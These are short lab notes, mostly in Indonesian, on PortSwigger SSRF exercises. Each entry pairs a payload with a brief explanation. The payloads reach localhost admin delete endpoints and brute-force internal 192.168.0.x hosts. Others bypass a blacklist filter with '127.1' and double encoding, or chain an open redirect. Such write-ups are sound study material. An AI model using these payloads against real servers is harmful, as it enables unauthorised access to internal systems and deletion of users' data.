### Basic SSRF against the local server

**Payload** : `http://localhost/admin/delete?username=carlos`
**Penjelasan** : pada server yang seharusnya melakukan request pada checkStock, diganti ke fitur halaman admin

### Basic SSRF against another back-end system

**Payload** : `http://192.168.0.$3$:8080/admin`
**Penjelasan** : Dengan melakukan brute pada ip yang memungkinkan ip yang memiliki page admin dengan bantuan intruder burpsuite

### SSRF with blacklist-based input filter

**Payload** : `http://127.1/%2561dmin/delete?username=carlos`
**Penjelasan** : [PortSwigger](https://book.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery/url-format-bypass#localhost)
alamat `127.1` sama dengan `127.0.0.1` dan mencoba untuk double encoding huruf a

### SSRF with filter bypass via open redirection vulnerability

**Payload** : `stockApi=%2Fproduct%2FnextProduct?%26path=http://192.168.0.12:8080/admin/delete?username=carlos
**Penjelasan** : karena pada halaman detail item, terdapat fitur next Item, dimana untuk menuju ke next item, perlu menggunakan path nextProduct, dan bisa memanfaatkan open redirect

